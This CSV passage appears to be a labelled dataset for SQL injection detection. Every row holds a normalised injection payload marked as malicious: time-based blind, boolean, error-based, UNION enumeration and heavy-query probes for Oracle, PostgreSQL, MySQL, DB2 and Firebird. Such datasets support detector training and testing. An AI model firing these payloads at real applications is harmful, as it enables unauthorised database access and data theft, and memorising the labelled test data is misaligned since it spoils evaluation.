row_index,payload_norm,label,sqli_type_hint
1830,"1"" ) as rgod where 5766 = 5766 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
1831,1' ) ) as dckd where 1794 = 1794,1,
1832,1' waitfor delay '0:0:5'--,1,
1833,"1"" ) ) ) and 4595 = 4595#",1,
1834,"1"" where 8016 = 8016",1,
1835,select pg_sleep ( 5 ) and ( ( ( '%' = ',1,
1836,"1, ( select ( case when ( 8382 = 8382 ) then 1 else 1/ ( select 0 ) end ) )",1,
1837,select ( case when ( 4624 = 4844 ) then 4624 else 1/ ( select 0 ) end ) --,1,
1838,"1"" ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( ""uisi"" = ""uisi",1,
1839,"1' ) where 7561 = 7561 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
1840,"1"" ) ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( ""atlz"" = ""atlz",1,
1841,"-5661' ) ) union all select 3011,3011#",1,
1842,"1', ( select ( case when ( 6560 = 2813 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",1,
1843,"-6292 ) union all select 7499,7499,7499,7499,7499,7499,7499--",1,
1844,"1 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) -- gkcl",1,
1845,"1 ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) )",1,
1846,"1"" ) order by 1--",1,
1847,"1"" union all select null,null,null#",1,
1848,"1' and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'rtbm' = 'rtbm",1,
1849,"1' ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
1850,"1 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) -- dpph",1,
1851,1' and 4374 = 2305,1,
1852,-2100' where 9260 = 9260 or 3038 = 3038,1,
1853,"1'|| ( select 'mwmn' where 5112 = 5112 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) ||'",1,
1854,"-9845"" ) as xpis where 1936 = 1936 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
1855,"-8098%' ) union all select 5697,5697,5697,5697,5697,5697,5697,5697,5697,5697#",1,
1856,-3497' order by 1#,1,
1857,1' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 'guxv' = 'guxv,1,
1858,"1 ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 7992 = 7992",1,
1859,1'|| ( select 'xlmt' where 1664 = 1664,1,
